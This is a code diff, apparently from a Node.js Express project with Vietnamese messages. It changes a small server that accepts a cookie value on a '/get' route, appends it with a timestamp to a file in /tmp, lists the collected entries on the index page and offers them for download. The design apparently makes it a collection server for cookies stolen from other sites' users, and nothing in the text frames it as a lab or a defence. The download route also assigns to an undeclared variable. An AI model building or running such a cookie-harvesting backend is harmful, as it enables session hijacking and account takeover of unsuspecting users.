@@ -15,7 +15,7 @@ app.set("server/views", path.join(__dirname, "views"));
 app.get("/", async (req, res) => {
   let data;
   try {
-    const pathName = path.join(__dirname, "get.txt");
+    const pathName = "/tmp/get.txt";
     data = await fs.readFile(pathName, { encoding: "utf8" });
     data = data
       .split("\n")
@@ -32,8 +32,14 @@ app.get("/", async (req, res) => {
   });
 });
 
-app.get("/download", (req, res) => {
-  res.download(path.join(__dirname, "get.txt"));
+app.get("/download", async (req, res) => {
+  try {
+    const pathName = "/tmp/get.txt";
+    data = await fs.readFile(pathName, { encoding: "utf8" });
+    res.download("/tmp/get.txt");
+  } catch (error) {
+    res.download(path.join(__dirname, "get.txt"));
+  }
 });
 
 app.get("/get", async (req, res) => {
@@ -43,11 +49,10 @@ app.get("/get", async (req, res) => {
       err: "Không có cookie.",
     });
   try {
-    const pathName = path.join(__dirname, "get.txt");
+    const pathName = "/tmp/get.txt";
     const content = `[${getTime()}]: ${cookie}\n`;
     await fs.writeFile(pathName, content, { flag: "a+" });
   } catch (err) {
-    console.log(err);
     return res.status(500).json({
       msg: "Lỗi server.",
       err: err,
@@ -58,7 +63,7 @@ app.get("/get", async (req, res) => {
   });
 });
 
-app.listen(5000, () => {
+app.listen(5000, async () => {
   console.log("Server is running on port 5000");
 });
 
